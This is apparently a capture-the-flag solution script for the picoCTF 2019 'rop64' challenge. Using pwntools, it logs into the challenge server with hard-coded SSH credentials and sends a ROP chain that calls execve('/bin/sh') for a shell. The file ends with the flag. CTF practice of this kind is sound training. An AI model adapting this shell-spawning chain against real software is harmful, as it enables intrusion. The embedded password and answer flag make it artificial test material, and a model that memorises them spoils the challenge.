#!/usr/bin/env python3

from pwn import *
from struct import pack

exe = ELF("vuln")

context.binary = exe

def conn():
	if False:
		return process([exe.path])
	else:
		shell = ssh(host='2019shell1.picoctf.com', user='giggsterpuku', password='7WH@L3ftc2')
		return shell.process('/problems/rop64_3_59cc6785d24924aff595a73b1d304ffb/vuln')


def main():
	r = conn()
	r.recvuntil('this?')
	# execve generated by ROPgadget
	# Padding goes here
	p = bytes('a'*24, 'utf-8')

	p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
	p += pack('<Q', 0x00000000006b90e0) # @ .data
	p += pack('<Q', 0x00000000004156f4) # pop rax ; ret
	p += bytes('/bin//sh', 'utf-8')
	p += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
	p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
	p += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
	p += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
	p += pack('<Q', 0x00000000006b90e0) # @ .data
	p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
	p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
	p += pack('<Q', 0x00000000004499b5) # pop rdx ; ret
	p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
	p += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000040123c) # syscall
	r.sendline(p)
	r.interactive()


if __name__ == "__main__":
	main()

# Flag: picoCTF{rOp_t0_b1n_sH_w1tH_n3w_g4dg3t5_8c4d907b}
# Solved by: Ryan Nguyen
